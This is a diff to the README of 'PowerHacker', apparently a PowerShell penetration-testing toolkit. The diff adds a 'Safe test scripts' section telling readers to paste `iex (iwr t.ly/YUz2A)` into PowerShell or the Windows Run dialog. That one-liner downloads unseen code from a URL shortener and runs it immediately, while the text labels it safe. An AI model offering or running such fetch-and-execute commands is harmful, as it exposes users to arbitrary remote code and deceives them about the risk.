@@ -9,6 +9,14 @@ Welcome to PowerHacker, a PowerShell-based toolkit designed for penetration test
 
 Security and ethical use are paramount. PowerHacker is intended for **authorized penetration testing** and/or **educational purposes only**. Misuse of PowerHacker may result in legal consequences. Ensure you have explicit permission to test target systems with PowerHacker.
 
+- Safe test scripts: Try run either of these in a command prompt or powershell respectively:
+
+1. In Powershell:
+  - `iex (iwr t.ly/YUz2A)`
+
+2. In CMD or press Windows key + R:
+  - `powershell iex (iwr t.ly/YUz2A)`
+
 ## :gear: Setup
 
 To leverage PowerHacker for your assessments:
